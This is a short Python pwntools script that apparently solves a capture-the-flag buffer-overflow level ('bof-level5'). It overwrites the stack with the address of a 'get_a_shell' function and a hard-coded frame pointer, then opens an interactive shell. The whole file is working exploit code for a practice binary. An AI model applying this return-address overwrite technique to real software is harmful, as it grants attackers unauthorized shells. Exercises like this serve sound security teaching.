#!/usr/bin/env python

from pwn import *

p = process('./bof-level5')

get_a_shell = 0x80484cb

p.sendline(p32(get_a_shell) * 32 + p32(0xffffd458)) # ebp: 0xffffd458

output = p.recv()
print(output)

p.interactive()
